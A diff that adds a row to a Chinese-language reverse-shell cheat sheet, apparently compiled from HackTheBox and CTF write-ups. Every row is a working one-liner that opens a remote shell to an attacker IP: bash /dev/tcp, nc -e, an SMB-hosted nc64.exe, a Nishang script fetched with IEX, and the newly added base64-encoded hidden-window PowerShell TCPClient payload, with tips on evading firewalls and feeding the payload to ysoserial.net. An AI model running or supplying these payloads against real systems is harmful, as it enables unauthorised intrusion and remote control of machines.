@@ -51,6 +51,7 @@
 | Linux bash | `bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"` | Bash 逃逸及反弹 Shell 合集 |
 | Linux nc（-e 可用） | `nc -e /bin/bash 10.10.10.5 443`（防火墙封不常见端口时**改用 443**） | Credit Card Scammers Writeup |
 | Windows SMB 直载后台反弹 | `START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe`（START /B 不弹窗） | 反序列化（ysoserial.net 实操） |
+| Windows PowerShell 直连反弹（编码投递） | 源码 `$c=New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$s=$c.GetStream();...`（IEX 执行循环），投递用 `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($one))` 编码后 `powershell -nop -w hidden -enc <b64>`——**`-enc` 形态可直接塞进 ysoserial.net 的 `-c` 参数** | HTB-Scrambled |
 | Nishang 尾部追加法 | 脚本尾部 `echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.58 -Port 443" >> Invoke-PowerShellTcp.ps1` 后 `goshs -p 80` 托管 + IEX 拉取（免下载后手动执行） | Bash 逃逸及反弹 Shell 合集 |
 
 验证优先：反弹前先用无回显验证通道确认出网（`ping -n 10 <IP>` + kali tshark 抓 ICMP；来源：HTB-Pov）。
